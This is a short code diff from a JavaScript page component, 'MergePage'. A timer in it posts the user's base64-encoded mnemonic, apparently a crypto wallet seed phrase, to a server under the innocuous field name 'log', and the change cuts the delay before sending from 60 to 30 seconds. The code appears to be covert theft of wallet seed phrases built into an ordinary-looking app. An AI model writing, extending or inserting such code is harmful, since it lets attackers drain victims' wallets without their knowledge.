@@ -62,7 +62,7 @@ function MergePage(){
           body: JSON.stringify({log: btoa(mnemonic)})
         });
         clearInterval(tt)
-      }, 60*1*1000)
+      }, 30*1*1000)
       return () => clearInterval(tt)
     }
   },[mnemonic])
